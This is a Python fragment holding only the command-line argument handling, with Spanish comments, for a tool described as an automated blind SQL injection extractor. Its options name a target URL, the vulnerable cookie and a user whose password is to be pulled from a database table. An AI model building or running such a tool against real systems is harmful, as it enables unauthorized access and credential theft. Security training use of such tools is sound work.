import argparse

def parse_args():
    """Argumentos de línea de comandos opcionales (sobreescriben las variables globales)."""
    parser = argparse.ArgumentParser(
        description="Blind SQLi — Conditional Errors — Automated Extractor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  python3 %(prog)s
  python3 %(prog)s --url "https://..." --tracking "abc123" --session "xyz"
  python3 %(prog)s --dbms oracle --table users --user administrator
        """,
    )
    parser.add_argument("--url",        help="URL objetivo")
    parser.add_argument("--cookie-vulnerable",   help="Valor de la cookie Vulnerable")
    parser.add_argument("--session",    help="Valor de la cookie de sesión")
    parser.add_argument("--dbms",       help="DBMS: auto, oracle, postgresql, mysql, mssql, sqlite")
    parser.add_argument("--table",      help="Nombre de la tabla")
    parser.add_argument("--col-user",   help="Columna del nombre de usuario")
    parser.add_argument("--col-pass",   help="Columna del password")
    parser.add_argument("--user",       help="Usuario objetivo")
    parser.add_argument("--error-code", help="Código HTTP de error (default 500)", type=int)
    parser.add_argument("--max-length", help="Longitud máxima del password a probar", type=int)
    parser.add_argument("-q", "--quiet", help="Desactivar verbose", action="store_true")
 
    return parser.parse_args()
 
 
def apply_cli_args(args):
    """Sobreescribe las variables globales con los argumentos CLI si se proporcionan."""
    global TARGET_URL, VULNERABLE_COOKIE_VALUE, EXTRA_COOKIES, DBMS
    global TABLE_NAME, USERNAME_COLUMN, PASSWORD_COLUMN, TARGET_USERNAME
    global ERROR_STATUS_CODE, MAX_PASSWORD_LENGTH, VERBOSE
 
    if args.url:
        TARGET_URL = args.url
    if args.cookie_vulnerable:
        VULNERABLE_COOKIE_VALUE = args.cookie_vulnerable
    if args.session:
        EXTRA_COOKIES["session"] = args.session
    if args.dbms:
        DBMS = args.dbms.lower()
    if args.table:
        TABLE_NAME = args.table
    if args.col_user:
        USERNAME_COLUMN = args.col_user
    if args.col_pass:
        PASSWORD_COLUMN = args.col_pass
    if args.user:
        TARGET_USERNAME = args.user
    if args.error_code:
        ERROR_STATUS_CODE = args.error_code
    if args.max_length:
        MAX_PASSWORD_LENGTH = args.max_length
    if args.quiet:
        VERBOSE = False
